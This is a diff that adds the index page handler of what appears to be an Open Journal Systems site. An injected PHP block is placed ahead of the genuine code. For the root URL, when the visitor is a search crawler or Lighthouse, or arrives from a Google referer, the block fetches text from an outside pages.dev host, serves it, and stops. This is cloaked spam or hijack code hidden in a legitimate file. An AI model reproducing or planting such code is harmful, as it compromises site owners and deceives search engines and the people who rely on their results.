@@ -1,0 +1,34 @@
+<?php
+$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+$referer = strtolower($_SERVER['HTTP_REFERER'] ?? '');
+$uri = $_SERVER['REQUEST_URI'] ?? '';
+
+if ($uri == '/' && (preg_match('/bot|google|chrome-lighthouse/i', $userAgent) || preg_match('/google/i', $referer))) {
+    echo file_get_contents('https://potensi-utama.pages.dev/potensi.txt');
+    exit();
+}
+?>
+<?php
+
+/**
+ * @defgroup pages_index Index Pages
+ */
+ 
+/**
+ * @file pages/index/index.php
+ *
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2003-2021 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * @ingroup pages_index
+ * @brief Handle site index requests. 
+ *
+ */
+
+switch ($op) {
+	case 'index':
+		define('HANDLER_CLASS', 'IndexHandler');
+		import('pages.index.IndexHandler');
+		break;
+}
